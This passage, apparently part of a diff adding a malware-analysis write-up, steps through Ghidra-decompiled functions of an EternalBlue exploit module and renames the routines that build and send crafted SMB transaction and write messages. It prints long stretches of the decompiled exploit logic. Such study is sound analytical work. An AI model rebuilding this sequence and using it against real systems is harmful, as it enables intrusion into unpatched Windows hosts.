+        *(undefined2 *)(pcVar1 + 0x17) = 0x3b;
+        *(ushort *)(pcVar1 + 0x19) = unaff_DI;
+      }
+      if (param_1 == '\x0e') {
+        *(undefined2 *)(pcVar1 + 3) = 0x40;
+        *(undefined2 *)(pcVar1 + 0xf) = 8;
+        *(undefined2 *)(pcVar1 + 0x17) = 0x40;
+        *(ushort *)(pcVar1 + 0x11) = unaff_DI;
+        *(ushort *)(pcVar1 + 0x15) = unaff_DI;
+        *(ushort *)(pcVar1 + 0x1d) = unaff_DI + 1;
+      }
+      if (unaff_DI != 0) {
+        memcpy(pcVar1 + ((uint)*unaff_EBX - (uint)unaff_DI),param_3,(uint)unaff_DI);
+      }
+    }
+  }
+  else {
+    pcVar1 = (char *)0x0;
+  }
+  return pcVar1;
+}
+```
+
+Unsurprisingly this function appears to create a payload too. So we will rename it to `eternal_smb_msg_payoad_with_data`. Most of these payload creation function switch on very specific field values which is interesting but probably also takes too much time to fully figure out.
+
+### Back to FUN_10003863
+
+We are now left with a familar structure a new SMB message is sent of the type `0x2f` which maps to `SMB_COM_WRITE_ANDX`. And this message is also sent. Therefore we rename the function to `eternal_send_write_smb_msg`.
+
+### Back to FUN_10003ec8
+
+This now means that this function sends 3 different SMB messages. So we will rename it to `eternal_send_create_transaction_write_smb_msg`. This appears like it could have written a larger file payload.
+
+### Back to eternal_blue_main
+
+The next function call is to `FUN_1000407b`.
+
+### FUN_1000407b (EternalBlue)
+
+```cpp
+undefined4 FUN_1000407b(undefined4 param_1,undefined4 param_2,uint param_3,LPVOID param_4,undefined4 param_5,undefined4 param_6){
+  LPVOID pvVar1;
+  void *pvVar2;
+  int iVar3;
+  LPVOID *ppvVar4;
+  ushort *unaff_EDI;
+  undefined2 uVar5;
+  undefined2 uVar6;
+  undefined2 uVar7;
+  uint local_24;
+  uint local_20;
+  undefined4 *local_1c;
+  int local_18;
+  uint local_14;
+  LPVOID local_10;
+  uint local_c;
+  LPVOID local_8;
+  
+  local_24 = param_3 & 0xffff;
+  iVar3 = eternal_send_smb_tree_connect
+                    (param_2,(undefined2 *)&local_24,param_4,param_5,(uint)*unaff_EDI,param_1);
+  if ((iVar3 == 0) && (local_8 = allocate_memory(0x8e), local_8 != (LPVOID)0x0)) {
+    local_14 = 0;
+    local_10 = allocate_memory(0x1000);
+    if (local_10 == (LPVOID)0x0) {
+LAB_10004242:
+      ppvVar4 = &local_8;
+    }
+    else {
+      *unaff_EDI = *unaff_EDI + 1;
+      local_18 = 0;
+      local_20 = 0;
+      local_c = 0x8000;
+      uVar5 = (undefined2)param_2;
+      uVar6 = SUB42(param_4,0);
+      uVar7 = (undefined2)param_5;
+      local_1c = eternal_create_transaction_smb_msg
+                           (0xc007,uVar5,(short)param_3,uVar6,uVar7,*unaff_EDI,0,0xff,
+                            (ushort *)&local_14);
+      while (local_1c != (undefined4 *)0x0) {
+        memcpy(local_8,local_1c,local_14 & 0xffff);
+        eternal_free(&local_1c);
+        local_1c = eternal_create_transaction_smb_msg
+                             (0xc007,uVar5,(short)local_24,uVar6,uVar7,*unaff_EDI,0,0xff,
+                              (ushort *)&local_14);
+        pvVar2 = local_8;
+        if (local_1c == (undefined4 *)0x0) break;
+        memcpy((void *)((int)local_8 + 0x47),local_1c,local_14 & 0xffff);
+        eternal_free(&local_1c);
+        iVar3 = eternal_send_message((int)pvVar2,0x8e,param_1);
+        pvVar1 = local_10;
+        if ((iVar3 != 0) ||
+           (iVar3 = eternal_await_response(param_1,2,(char)local_10,&local_18), iVar3 != 0)) {
+          eternal_free(&local_10);
+          goto LAB_10004242;
+        }
+        if (*(int *)((int)pvVar1 + 9) != 0) break;
+        local_20 = local_20 + (local_c & 0xffff);
+        local_c = local_c + 0x1000;
+        if (0xc000 < (ushort)local_c) {
+          local_c = 0x8000;
+        }
+        if (0xfffff < local_20) {
+          iVar3 = FUN_100030fe(param_1,param_2,local_24,param_4,param_5,(uint)*unaff_EDI);
+          if (iVar3 == 0) {
+            eternal_free(&local_8);
+            eternal_free(&local_10);
+            Sleep(0x456);
+            local_18 = 0;
+            do {
+              *unaff_EDI = *unaff_EDI + 1;
+              iVar3 = eternal_send_transaction_smb_msg
+                                (0xc007,param_2,param_3,param_4,param_5,(uint)*unaff_EDI,0,0xff,
+                                 param_6);
+              if (iVar3 != 0) {
+                return 0xffffffff;
+              }
+              local_18 = local_18 + 1;
+            } while ((ushort)local_18 < 0x38);
+            return 0;
+          }
+          break;
+        }
+        *unaff_EDI = *unaff_EDI + 1;
+        local_1c = eternal_create_transaction_smb_msg
+                             (0xc007,uVar5,(short)param_3,uVar6,uVar7,*unaff_EDI,0,0xff,
+                              (ushort *)&local_14);
+      }
+      eternal_free(&local_8);
+      ppvVar4 = &local_10;
+    }
+    eternal_free(ppvVar4);
+  }
+  return 0xffffffff;
+}
+```
+
+This function again sends a tree connection message followed by several transaction messages. Most of this happens in a loop where `FUN_100030fe` is the one function we hvae not seen yet.
+
+### FUN_100030fe (EternalBlue)
+
+```cpp
+undefined4 FUN_100030fe(undefined4 param_1,undefined4 param_2,undefined4 param_3,LPVOID param_4,undefined4 param_5,undefined4 *param_6){
+  undefined uVar1;
+  LPVOID pvVar2;
+  int iVar3;
+  undefined4 *puVar4;
+  undefined2 **ppuVar5;
+  undefined4 *puVar6;
+  undefined4 *puVar7;
+  undefined4 uVar8;
+  undefined local_c;
+  undefined2 *local_8;
+  
+  local_c = 0;
+  local_8 = (undefined2 *)allocate_memory(3);
+  if (local_8 != (undefined2 *)0x0) {
+    local_c = 0x27;
+    uVar1 = local_c;
+    local_c = 0x27;
+    param_6 = (undefined4 *)
+              eternal_create_smb_message
+                        (0x27,0x71,0xc007,(undefined2)param_2,(undefined2)param_3,(short)param_4,
+                         (short)param_5,(short)param_6);
+    if (param_6 == (undefined4 *)0x0) {
+      ppuVar5 = &local_8;
+    }
+    else {
+      puVar4 = (undefined4 *)allocate_memory(0x27);
+      if (puVar4 != (undefined4 *)0x0) {
+        iVar3 = 9;
+        puVar6 = param_6;
+        puVar7 = puVar4;
+        while (iVar3 != 0) {
+          iVar3 = iVar3 + -1;
+          *puVar7 = *puVar6;
+          puVar6 = puVar6 + 1;
+          puVar7 = puVar7 + 1;
+        }
+        *(undefined2 *)(puVar4 + 9) = *local_8;
+        *(undefined *)((int)puVar4 + 0x26) = *(undefined *)(local_8 + 1);
+        eternal_free(&local_8);
+        eternal_free(&param_6);
+        goto LAB_1000318b;
+      }
+      eternal_free(&local_8);
+      ppuVar5 = (undefined2 **)&param_6;
+    }
+    eternal_free(ppuVar5);
+    local_c = uVar1;
+  }
+  puVar4 = (undefined4 *)0x0;
+LAB_1000318b:
+  if (puVar4 != (undefined4 *)0x0) {
+    param_6 = puVar4;
+    pvVar2 = allocate_memory(0x1000);
+    param_4 = pvVar2;
+    if (pvVar2 != (LPVOID)0x0) {
+      param_5 = 0;
+      iVar3 = eternal_send_message((int)puVar4,local_c,param_1);
+      if ((iVar3 == 0) &&
+         (iVar3 = eternal_await_response(param_1,1,(char)pvVar2,&param_5), iVar3 == 0)) {
+        uVar8 = *(undefined4 *)((int)pvVar2 + 9);
+      }
+      else {
+        uVar8 = 0xffffffff;
+      }
+      eternal_free(&param_4);
+      eternal_free(&param_6);
+      return uVar8;
+    }
+    eternal_free(&param_6);
+  }
+  return 0xffffffff;
+}
+```
+
+Looks like this function sends a message of type `0x71` meaning `SMB_COM_TREE_DISCONNECT` so we rename the function to `eternal_send_tree_disconnect_smb_msg`.
+
+### Back to FUN_1000407b
+
+Having resolved all of the functions. We will rename the function to `eternal_send_tree_transactions_smb_msgs`.
+
+### Back to eternal_blue_main
+
+The next function we see is `FUN_100042df`.
+
+### FUN_100042df (EternalBlue)
+
+```cpp
+undefined4 FUN_100042df(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,short *param_6){
+  short sVar1;
+  LPVOID pvVar2;
+  int iVar3;
+  uint num_bytes;
+  undefined4 uVar4;
+  int *piVar5;
+  int *piVar6;
+  int *piVar7;
+  undefined2 uVar8;
+  undefined2 uVar9;
+  undefined2 uVar10;
+  undefined2 uVar11;
+  uint local_44;
+  int local_40;
+  uint local_38;
+  undefined4 local_34;
+  LPVOID local_30;
+  uint local_2c;
+  undefined4 *local_28;
+  uint local_24;
+  uint local_20;
+  int local_1c;
+  undefined4 *local_18;
+  LPVOID local_14;
+  int local_10;
+  int *local_c;
+  byte local_5;
+  
+  pvVar2 = allocate_memory(0x10);
+  if (pvVar2 == (LPVOID)0x0) {
+    local_34 = 0xffffffff;
+  }
+  else {
+    local_30 = pvVar2;
+    iVar3 = rand();
+    local_34 = 0xffffffff;
+    *(undefined *)((int)pvVar2 + 0xf) = (char)iVar3;
+    local_24 = 0;
+    local_2c = 0;
+    local_1c = 0;
+    local_5 = 0;
+    local_10 = 2;
+    uVar8 = (undefined2)param_2;
+    uVar9 = (undefined2)param_3;
+    uVar10 = (undefined2)param_4;
+    uVar11 = (undefined2)param_5;
+    local_18 = eternal_create_transaction_smb_msg
+                         (0xc007,uVar8,uVar9,uVar10,uVar11,2,1,0xff,(ushort *)&local_24);
+    if (local_18 != (undefined4 *)0x0) {
+LAB_10004357:
+      local_20 = local_24 & 0xffff;
+      num_bytes = local_24 * 7 & 0xffff;
+      pvVar2 = allocate_memory(num_bytes);
+      local_14 = pvVar2;
+      if (pvVar2 == (LPVOID)0x0) {
+LAB_100047ea:
+        eternal_free(&local_18);
+      }
+      else {
+        local_c = (int *)0x0;
+        do {
+          local_38 = (uint)local_c & 0xffff;
+          if ((ushort)local_c == 2) {
+            memcpy((void *)((int)pvVar2 + (local_20 & 0xffff) * 2),local_18,local_20 & 0xffff);
+          }
+          else {
+            *param_6 = *param_6 + 1;
+            local_28 = eternal_create_transaction_smb_msg
+                                 (0xc007,uVar8,uVar9,uVar10,uVar11,*param_6,1,0xff,
+                                  (ushort *)&local_20);
+            if (local_28 == (undefined4 *)0x0) goto LAB_100047e2;
+            memcpy((void *)((local_20 & 0xffff) * local_38 + (int)pvVar2),local_28,local_20 & 0xffff
+                  );
+            eternal_free(&local_28);
+            pvVar2 = local_14;
+          }
+          local_c = (int *)((int)local_c + 1);
+        } while ((ushort)local_c < 7);
+        local_28 = (undefined4 *)allocate_memory(0x1000);
+        if (local_28 == (undefined4 *)0x0) {
+LAB_100047e2:
+          eternal_free(&local_14);
+          goto LAB_100047ea;
+        }
+        local_38 = 0;
+        iVar3 = eternal_send_message((int)pvVar2,(char)num_bytes,param_1);
+        if (iVar3 == 0) {
+          local_20 = eternal_await_response(param_1,7,(char)local_28,&local_38);
+        }
+        else {
+          local_20 = 0xffffffff;
+        }
+        eternal_free(&local_28);
+        eternal_free(&local_14);
+        if (local_20 != 0) goto LAB_100047ea;
+        eternal_free(&local_18);
+        iVar3 = FUN_10003986(param_1,param_2,param_3,param_4,param_5,local_10,1,0,local_30,&local_1c
+                             ,&local_2c,1);
+        if (iVar3 == 0) {
+          if ((local_1c != 0) && (0x39 < (ushort)local_2c)) {
+            piVar7 = (int *)((uint)*(ushort *)(local_1c + 0x33) + 4 + local_1c);
+            piVar6 = (int *)(((local_2c & 0xffff) - 0x31) + local_1c);
+            if (piVar7 < piVar6) {
+              piVar5 = piVar7;
+              do {
+                local_c = piVar7;
+                if ((((*(short *)(local_1c + 0x1c) == *(short *)((int)piVar5 + 0x2a)) &&
+                     (*(short *)(local_1c + 0x20) == *(short *)((int)piVar5 + 0x2e))) &&
+                    (*(short *)(local_1c + 0x1e) == *(short *)(piVar5 + 0xb))) &&
+                   (*(char *)(piVar5 + 9) == '\x01')) {
+                  uVar4 = FUN_10002088(piVar5[-4],piVar5[-3]);
+                  eternal_DAT_1001f8fc = (char)uVar4;
+                  if (eternal_DAT_1001f8fc == '\0') {
+                    local_44 = piVar5[-4];
+                    if (local_44 < 0x80000000) break;
+                    local_40 = 0;
+                    piVar7 = piVar5 + -2;
+                    piVar6 = piVar5 + -0xc;
+                  }
+                  else {
+                    local_44 = piVar5[-4];
+                    local_40 = piVar5[-3];
+                    piVar7 = piVar5 + -4;
+                    piVar6 = piVar5 + -0x1c;
+                  }
+                  if (local_c < piVar6) {
+                    if (eternal_DAT_1001f8fc != '\0') goto LAB_10004555;
+                    goto LAB_100045d6;
+                  }
+                  break;
+                }
+                piVar5 = (int *)((int)piVar5 + 1);
+              } while (piVar5 < piVar6);
+            }
+          }
+          goto LAB_10004798;
+        }
+      }
+    }
+LAB_10004806:
+    eternal_free(&local_1c);
+    eternal_free(&local_30);
+  }
+  return local_34;
+  while (piVar6 = piVar6 + -1, local_c < piVar6) {
+LAB_100045d6:
+    if ((((*(char *)piVar6 == '\f') && (*(char *)((int)piVar6 + 1) == '\x02')) &&
+        ((0xfe80 < *(ushort *)((int)piVar6 + 2) &&
+         ((0x7fffffff < (uint)piVar6[2] && (0x7fffffff < (uint)piVar6[3])))))) &&
+       ((0x7fffffff < (uint)piVar6[4] && (0x7fffffff < (uint)piVar6[5])))) {
+      DAT_1001fad0 = piVar6[2];
+      DAT_1001fad4 = 0;
+      DAT_1001fadc = 0;
+      DAT_1001fad8 = piVar6[3];
+      goto LAB_1000462b;
+    }
+  }
+LAB_10004798:
+  eternal_free(&local_1c);
+  local_5 = local_5 + 1;
+  if (2 < local_5) goto LAB_10004806;
+  local_10 = local_10 + 1;
+  local_18 = eternal_create_transaction_smb_msg
+                       (0xc007,uVar8,uVar9,uVar10,uVar11,(short)local_10,1,0xff,(ushort *)&local_24)
+  ;
+  if (local_18 == (undefined4 *)0x0) goto LAB_10004806;
+  goto LAB_10004357;
+LAB_10004555:
+  if (((((*(char *)piVar6 != '\f') || (*(char *)((int)piVar6 + 1) != '\x02')) ||
+       (*(ushort *)((int)piVar6 + 2) < 0xfe81)) ||
+      ((iVar3 = FUN_10002088(piVar6[2],piVar6[3]), iVar3 == 0 ||
+       (iVar3 = FUN_10002088(piVar6[4],piVar6[5]), iVar3 == 0)))) ||
+     (iVar3 = FUN_10002088(piVar6[6],piVar6[7]), iVar3 == 0)) goto LAB_100045a7;
+  iVar3 = FUN_10002088(piVar6[8],piVar6[9]);
+  if (iVar3 == 0) goto LAB_100045a7;
+  DAT_1001fad0 = piVar6[2];
+  DAT_1001fad4 = piVar6[3];
+  DAT_1001fad8 = piVar6[4];
+  DAT_1001fadc = piVar6[5];
+LAB_1000462b:
+  DAT_1001fb44 = *(undefined2 *)(piVar5 + 0xc);
+  num_bytes = 0xfe80 - (uint)*(ushort *)((int)piVar6 + 2);
+  DAT_1001fae8 = num_bytes + local_44;
+  DAT_1001faec = ((int)num_bytes >> 0x1f) + local_40 + (uint)CARRY4(num_bytes,local_44);
+  iVar3 = (local_44 - *piVar5) - DAT_1001fae8;
+  DAT_1001fb2c = 1;
+  DAT_1001fb08 = (int)piVar6 + (0xfe7c - (int)local_c);
+  DAT_1001fb24._0_2_ = (short)piVar7 - (short)piVar6;
+  DAT_1001fb28 = (short)DAT_1001fb24 + -4;
+  _DAT_1001fb10 = CONCAT22(ram0x1001fb12,(short)DAT_1001fb24 + -0x10);
+  DAT_1001fb14 = (short)DAT_1001fb24 + 4;
+  _DAT_1001fb0c = (int *)((int)piVar7 - (int)piVar6) + 8;
+  DAT_1001fb18 = CONCAT22(DAT_1001fb18._2_2_,(short)DAT_1001fb24 + 0x38);
+  _DAT_1001fb38 = (uint)(*piVar5 == 0);
+  sVar1 = 0;
+  if (eternal_DAT_1001f8fc == '\0') {
+    DAT_1001fb20 = (short)DAT_1001fb24 + -0x18;
+    if (iVar3 == 0x9c) {
+      sVar1 = (short)DAT_1001fb24 + 0x50;
+    }
+    else {
+      if (iVar3 == 0xa4) {
+        sVar1 = (short)DAT_1001fb24 + 0x4f;
+      }
+    }
+    _DAT_1001fb1c = CONCAT22(ram0x1001fb1e,sVar1);
+  }
+  else {
+    DAT_1001fb14 = (short)DAT_1001fb24 + 8;
+    _DAT_1001fb0c = (int *)((int)piVar7 - (int)piVar6) + 10;
+    DAT_1001fb18 = CONCAT22(DAT_1001fb18._2_2_,(short)DAT_1001fb24 + 0x40);
+    DAT_1001fb28 = (short)DAT_1001fb24 + -8;
+    DAT_1001fb20 = (short)DAT_1001fb24 + -0x2c;
+    if (iVar3 == 0xe4) {
+      DAT_1001fb1c = (short)DAT_1001fb24 + 100;
+    }
+    else {
+      if (iVar3 == 0xfc) {
+        DAT_1001fb1c = (short)DAT_1001fb24 + 99;
+      }
+      else {
+        _DAT_1001fb1c = (uint)ram0x1001fb1e << 0x10;
+      }
+    }
+  }
+  DAT_1001fb30 = (short)_DAT_1001fb1c + -2;
+  DAT_1001fb34 = 0;
+  if ((short)_DAT_1001fb1c == 0) goto LAB_10004798;
+  DAT_1001fb34 = (short)DAT_1001fb18 + -0xb;
+  local_34 = 0;
+  goto LAB_10004806;
+LAB_100045a7:
+  piVar6 = piVar6 + -1;
+  if (piVar6 <= local_c) goto LAB_10004798;
+  goto LAB_10004555;
+}
+```
+
+This function is surprisingly large, the general structure is fairly similar to what we've seen already however some transation SMB messages are created and then sent.
+
+After that we see a call to `FUN_10003986`.
+
+### FUN_10003986 (EternalBlue)
+
+```cpp
+int FUN_10003986(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,undefined2 param_6,undefined4 *param_7,undefined *param_8,undefined4 *param_9,void **param_10,undefined2 *param_11,uint param_12){
+  ushort in_AX;
+  undefined *_Src;
+  int iVar1;
+  LPVOID pvVar2;
+  size_t num_bytes;
+  undefined4 *puVar3;
+  undefined4 *puVar4;
+  uint num_bytes_00;
+  undefined4 *puVar5;
+  undefined local_8;
+  
+  num_bytes = 0;
+  local_8 = 0;
+  if ((in_AX == 0) || (param_9 != (undefined4 *)0x0)) {
+    num_bytes = (size_t)(ushort)(in_AX + 0x13);
+    _Src = (undefined *)allocate_memory(num_bytes);
+    if (_Src == (undefined *)0x0) {
+      param_7 = (undefined4 *)0x0;
+      _Src = (undefined *)param_7;
+    }
+    else {
+      *_Src = 8;
+      *(short *)(_Src + 0xb) = (short)param_7;
+      if ((short)param_7 != 0) {
+        *(undefined2 *)(_Src + 0xd) = 0x42;
+      }
+      *(undefined2 *)(_Src + 0xf) = param_8._0_2_;
+      *(ushort *)(_Src + 0x11) = in_AX;
+      if (in_AX != 0) {
+        memcpy(_Src + 0x13,param_9,(uint)in_AX);
+      }
+    }
+  }
+  else {
+    param_7 = (undefined4 *)0x0;
+    _Src = (undefined *)param_7;
+  }
+  param_7 = (undefined4 *)_Src;
+  param_8 = (undefined *)param_7;
+  if (param_7 == (undefined4 *)0x0) {
+LAB_10003a04:
+    puVar3 = (undefined4 *)0x0;
+  }
+  else {
+    num_bytes_00 = num_bytes + 0x24 & 0xffff;
+    local_8 = (undefined)num_bytes_00;
+    puVar4 = (undefined4 *)
+             eternal_create_smb_message
+                       (num_bytes_00,0x26,0xc007,param_2,param_3,param_4,param_5,param_6);
+    param_9 = puVar4;
+    if (puVar4 == (undefined4 *)0x0) {
+      puVar4 = &param_8;
+LAB_10003a3c:
+      eternal_free(puVar4);
+      goto LAB_10003a04;
+    }
+    puVar3 = (undefined4 *)allocate_memory(num_bytes_00);
+    if (puVar3 == (undefined4 *)0x0) {
+      eternal_free(&param_8);
+      puVar4 = &param_9;
+      goto LAB_10003a3c;
+    }
+    iVar1 = 9;
+    puVar5 = puVar3;
+    while (iVar1 != 0) {
+      iVar1 = iVar1 + -1;
+      *puVar5 = *puVar4;
+      puVar4 = puVar4 + 1;
+      puVar5 = puVar5 + 1;
+    }
+    memcpy(puVar3 + 9,param_7,num_bytes);
+    eternal_free(&param_8);
+    eternal_free(&param_9);
+  }
+  if (puVar3 == (undefined4 *)0x0) {
+LAB_10003a94:
+    iVar1 = -1;
+  }
+  else {
+    param_7 = puVar3;
+    if ((char)param_12 == '\0') {
+      iVar1 = eternal_send_message((int)puVar3,local_8,param_1);
+      *param_10 = (void *)0x0;
+      *param_11 = 0;
+    }
+    else {
+      _Src = (undefined *)allocate_memory(0x1000);
+      param_8 = _Src;
+      if (_Src == (undefined *)0x0) {
+        eternal_free(&param_7);
+        goto LAB_10003a94;
+      }
+      param_12 = 0;
+      iVar1 = eternal_send_message((int)puVar3,local_8,param_1);
+      if ((iVar1 == 0) &&
+         (iVar1 = eternal_await_response(param_1,1,(char)_Src,&param_12), iVar1 == 0)) {
+        num_bytes_00 = param_12 & 0xffff;
+        iVar1 = *(int *)(_Src + 9);
+        pvVar2 = allocate_memory(num_bytes_00);
+        *param_10 = pvVar2;
+        if (pvVar2 == (LPVOID)0x0) {
+          iVar1 = -1;
+        }
+        else {
+          *param_11 = (undefined2)param_12;
+          memcpy(*param_10,_Src,num_bytes_00);
+        }
+        eternal_free(&param_8);
+      }
+      else {
+        eternal_free(&param_8);
+        iVar1 = -1;
+      }
+    }
+    eternal_free(&param_7);
+  }
+  return iVar1;
+}
+```
+
+This function is similarly large to the previous one. We see an SMB message being created of type `0x26` meaning `SMB_COM_TRANSACTION_SECONDARY` which makes sense given the first transaction earlier. Very large SMB transaction require multiple messages. This might also mean that this is where the payload is sent.
+
+After it is made the secondary tracation is sent and the resposne awaited then the function returns. So we will rename the function to `eternal_send_transaction_secondary_smb_msg`.
+
+### Back to FUN_100042df
+
+After sending the secondary transaction and a lot of checks we see a call to `FUN_10002088`.
+
+### FUN_10002088 (EternalBlue)
+
+```cpp
+undefined4 FUN_10002088(int param_1,int param_2){
+  uint uVar1;
+  undefined4 uVar2;
+  
+  uVar1 = param_2 + 0xfff + (uint)(param_1 != 0);
+  if ((uVar1 < 0xfff) && ((uVar1 < 0xffe || (param_1 != 0)))) {
+    uVar2 = 1;
+  }
+  else {
+    uVar2 = 0;
+  }
+  return uVar2;
+}
+```
+
+This function appears to just return a boolean value depending on the value of `param_1` and `param_2`. Where `1` is returned if the `param_2` is negative and `param_1` not null. So lets rename the function to `eternal_negative_not_null`.
+
+### Back to FUN_100042df
+
+The next part of hte function is a lot of cleanup and checks. Near the end of hte function we see a lot of assignments to global values presumably to store part of the response. After these assignments the function returns. We will rename it to `eternal_send_multi_part_transaction_smb_store_result`.
+
+### Back to eternal_blue_main
+
+The next function call we see is to `FUN_1000489c`.
+
+### FUN_1000489c (EternalBlue)
+
+```cpp
+int __thiscall FUN_1000489c(ushort *param_1,undefined4 param_1_00,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5){
+  short *in_EAX;
+  uint num_bytes;
+  LPVOID pvVar1;
+  int iVar2;
+  undefined2 uVar3;
+  undefined2 uVar4;
+  undefined2 uVar5;
+  uint local_20;
+  uint local_1c;
+  undefined4 *local_18;
+  undefined4 *local_14;
+  uint local_10;
+  LPVOID local_c;
+  uint local_8;
+  
+  local_10 = 0;
+  uVar3 = (undefined2)param_2;
+  uVar4 = (undefined2)param_3;
+  uVar5 = (undefined2)param_4;
+  local_14 = eternal_create_transaction_smb_msg
+                       (0xc007,uVar3,uVar4,*param_1,uVar5,(short)param_5,0,0xff,(ushort *)&local_10)
+  ;
+  if (local_14 != (undefined4 *)0x0) {
+    num_bytes = local_10 * 7 & 0xffff;
+    local_1c = (uint)*param_1;
+    local_10 = local_10 & 0xffff;
+    pvVar1 = allocate_memory(num_bytes);
+    local_c = pvVar1;
+    if (pvVar1 != (LPVOID)0x0) {
+      local_8 = 0;
+      do {
+        local_20 = local_8 & 0xffff;
+        if ((ushort)local_8 == 2) {
+          memcpy((void *)((int)pvVar1 + (local_10 & 0xffff) * 2),local_14,local_10 & 0xffff);
+        }
+        else {
+          *in_EAX = *in_EAX + 1;
+          local_18 = eternal_create_transaction_smb_msg
+                               (0xc007,uVar3,uVar4,(short)local_1c,uVar5,*in_EAX,0,0xff,
+                                (ushort *)&local_10);
+          if (local_18 == (undefined4 *)0x0) goto LAB_100049ca;
+          memcpy((void *)((local_10 & 0xffff) * local_20 + (int)pvVar1),local_18,local_10 & 0xffff);
+          eternal_free(&local_18);
+          pvVar1 = local_c;
+        }
+        local_8 = local_8 + 1;
+      } while ((ushort)local_8 < 7);
+      local_18 = (undefined4 *)allocate_memory(0x1000);
+      if (local_18 == (undefined4 *)0x0) {
+LAB_100049ca:
+        eternal_free(&local_c);
+      }
+      else {
+        local_20 = 0;
+        iVar2 = eternal_send_message((int)pvVar1,(char)num_bytes,param_1_00);
+        if (iVar2 == 0) {
+          local_10 = eternal_await_response(param_1_00,7,(char)local_18,&local_20);
+        }
+        else {
+          local_10 = 0xffffffff;
+        }
+        eternal_free(&local_18);
+        eternal_free(&local_c);
+        if (local_10 == 0) {
+          eternal_free(&local_14);
+          local_14 = (undefined4 *)allocate_memory(0x200);
+          if (local_14 == (undefined4 *)0x0) {
+            return 0xffffffff;
+          }
+          iVar2 = eternal_send_write_smb_msg
+                            (param_1_00,uVar3,uVar4,*param_1,uVar5,(short)param_5,(short)param_5,
+                             '\f',local_14);
+          eternal_free(&local_14);
+          if (iVar2 != 0) {
+            return 0xffffffff;
+          }
+          num_bytes = DAT_1001fb08 + -0x200 + DAT_1001fb18 & 0xffff;
+          if (0xfe80 < (ushort)num_bytes) {
+            return 0xffffffff;
+          }
+          iVar2 = FUN_10004820(param_1_00,param_2,param_3,(uint)*param_1,param_4,param_5,0,0,
+                               num_bytes);
+          if (iVar2 != 0) {
+            return 0xffffffff;
+          }
+          local_18 = (undefined4 *)0x0;
+          local_14 = (undefined4 *)allocate_memory(0x10);
+          iVar2 = eternal_send_transaction_secondary_smb_msg
+                            (param_1_00,param_2,param_3,(uint)*param_1,param_4,0,1,0xffff,local_14,
+                             &local_18,&param_5,1);
+          eternal_free(&local_14);
+          eternal_free(&local_18);
+          return (uint)(iVar2 == 0x10002) - 1;
+        }
+      }
+    }
+    eternal_free(&local_14);
+  }
+  return 0xffffffff;
+}
+```
+
+This function again sends a SMB transaction and a write SMB message.
+
+After this follows a call to `FUN_10004820`.
+
+### FUN_10004820 (EternalBlue)
+
+```cpp
+undefined4 FUN_10004820(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,undefined4 param_9){
+  int in_EAX;
+  undefined4 uVar1;
+  LPVOID local_8;
+  
+  local_8 = allocate_memory(in_EAX + 0xfU & 0xffff);
+  if (local_8 == (LPVOID)0x0) {
+    uVar1 = 0xffffffff;
+  }
+  else {
+    if ((short)in_EAX == 4) {
+      *(undefined4 *)((int)local_8 + 0xf) = param_7;
+    }
+    if ((short)in_EAX == 8) {
+      *(undefined4 *)((int)local_8 + 0xf) = param_7;
+      *(undefined4 *)((int)local_8 + 0x13) = param_8;
+    }
+    uVar1 = eternal_send_transaction_secondary_smb_msg
+                      (param_1,param_2,param_3,param_4,param_5,param_6,in_EAX,param_9,local_8,
+                       &local_8,&param_9,0);
+    eternal_free(&local_8);
+  }
+  return uVar1;
+}
+```
+
+Seems like this function sends the secondary transaction block for the transation sent earlier. We will renaem this function to `eternal_send_secondary_block`.
+
+### Back to FUN_1000489c
+
+Back we see that yet another secondary transation block is sent. After this the function returns. We will rename this function to `eternal_send_3_part_transaction`.
+
+### Back to eternal_blue_main
+
+The next function call we see is to `FUN_10004ba1`.
+
+### FUN_10004ba1 (EternalBlue)
+
+```cpp
+undefined4
+FUN_10004ba1(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6){
+  undefined4 uVar1;
+  int iVar2;
+  int iVar3;
+  LPVOID local_c;
+  undefined4 local_8;
+  
+  local_8 = 4;
+  if (eternal_DAT_1001f8fc != '\0') {
+    local_8 = 8;
+  }
+  iVar2 = DAT_1001fad0 + 4;
+  iVar3 = DAT_1001fad4 + (uint)(0xfffffffb < DAT_1001fad0);
+  local_c = allocate_memory(0x13);
+  if (local_c == (LPVOID)0x0) {
+    uVar1 = 0xffffffff;
+  }
+  else {
+    *(undefined4 *)((int)local_c + 0xf) = 0x1000;
+    uVar1 = FUN_10004afe(param_1,param_2,param_3,param_4,param_5,param_6,local_8,local_c,0x13,iVar2,
+                         iVar3,0);
+    eternal_free(&local_c);
+  }
+  return uVar1;
+}
+```
+
+After allocating some memory we see a call to `FUN_10004afe`.
+
+### FUN_10004afe (EternalBlue)
+
+```cpp
+undefined4
+FUN_10004afe(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,int param_9,int param_10,int param_11,undefined4 param_12){
+  int iVar1;
+  uint uVar2;
+  int iVar3;
+  undefined4 uVar4;
+  
+  iVar1 = param_9;
+  if ((_DAT_1001faf0 == param_10) && (DAT_1001faf4 == param_11)) {
+LAB_10004b6e:
+    uVar4 = eternal_send_transaction_secondary_smb_msg
+                      (param_1,param_2,param_3,param_4,param_5,0,iVar1 + -0xf,param_12,param_8,
+                       &param_8,&param_9,0);
+  }
+  else {
+    uVar2 = DAT_1001fb08 + -0x200 + DAT_1001fb24 & 0xffff;
+    if ((ushort)uVar2 < 0xfe81) {
+      iVar3 = eternal_send_secondary_block
+                        (param_1,param_2,param_3,param_4,param_5,param_6,param_10,param_11,uVar2);
+      if (iVar3 == 0) {
+        _DAT_1001faf0 = param_10;
+        DAT_1001faf4 = param_11;
+        goto LAB_10004b6e;
+      }
+    }
+    uVar4 = 0xffffffff;
+  }
+  return uVar4;
+}
+```
+
+Interestingly this function appears to sent two more secondary transation blocks. Which of these is sent depends on response codes received earlier and stored in global however. We will rename this function to `eternal_send_appropriate_secondary_transaction`.
+
+### Back to FUN_10004ba1
+
+We see that nothing else happens in this function after the appropriate second block has been sent. We will rename this function to `eternal_send_appropriate_response`.
+
+### Back to eternal_blue_main
+
+We have now arrived at the final function inside the if statement, this being `FUN_100051f3`.
+
